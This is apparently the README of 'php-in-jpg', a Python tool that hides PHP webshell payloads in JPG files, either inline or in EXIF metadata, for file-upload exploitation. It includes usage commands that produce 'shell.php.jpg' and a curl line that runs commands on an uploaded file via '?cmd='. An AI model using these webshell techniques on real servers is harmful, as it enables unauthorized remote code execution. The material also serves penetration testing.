# php-in-jpg

**php-in-jpg** is a simple but flexible tool that generates `.jpg` image files embedding PHP payloads.  
It supports two techniques:

- **Inline payload**: appends PHP code directly to the image
- **EXIF metadata injection**: embeds the payload in the image's comment field using `exiftool`.

By default, the payload uses the **GET-based execution mode** (`?cmd=your_command`) unless a fixed command is specified.

This tool is designed to support **PHP RCE polyglot techniques**, often used in upload-based exploitation scenarios or webshell demonstrations.

---

## 🛠️ Features

- Embed PHP payload directly or via EXIF metadata
- Choose between a **fixed command** or `?cmd=` **GET-based execution**
- Support for custom or default HTML/PHP templates with `{{COMMAND}}` and `{{OUTPUT}}`
- Optional preview-only mode: show payload without writing files
- Clean HTML output styling (terminal-like, via default template)
- Fully CLI-friendly and cross-platform (Python 3.8+)

---

## 🚀 Usage

```bash
python php-in-jpg.py -m <method> [options]
```

### Available options:

| Option                | Description                                                                 |
|-----------------------|-----------------------------------------------------------------------------|
| `-m, --method`        | Insertion method: `inline` or `metadata` (**required**)                     |
| `-c, --cmd-mode`      | Command mode: `fixed` (static command) or `get` (dynamic via `?cmd=`). Default is `get`. |
| `-x, --fixed-cmd`     | Fixed shell command to embed (required if `--cmd-mode fixed`)               |
| `-o, --output`        | Output file name (e.g. `payload.php.jpg`)                                   |
| `-t, --template`      | Optional template with `{{COMMAND}}` and `{{OUTPUT}}` placeholders          |
| `--show-payload`      | Print PHP payload to screen only, no file creation                          |

---

## 📦 Examples

```bash
# Embed a fixed command using inline method
python php-in-jpg.py -m inline -c fixed -x "whoami" -o shell.php.jpg

# Embed dynamic GET-based payload via EXIF (default cmd-mode)
python php-in-jpg.py -m metadata -o payload.php.jpg

# Access via browser or curl: payload.php.jpg?cmd=pwd
curl "http://target/upload/payload.php.jpg?cmd=pwd"

# Just preview the generated PHP code
python php-in-jpg.py -m inline -c fixed -x "ls -l" --show-payload
```

---

## 📁 Template system

Templates must contain the following placeholders:

- `{{COMMAND}}`: replaced with the displayed command
- `{{OUTPUT}}`: replaced with the actual `system(...)` or similar execution block

A default template is located in: `template/default.tpl`

---

## 🔧 Requirements

- Python 3.8+
- Python dependencies: install via `pip install -r requirements.txt`
- `exiftool` (external tool, used for metadata injection)

---

## ⚠️ Disclaimer

This tool is for **educational and authorized testing purposes only**.  
Do not use it in unauthorized environments.
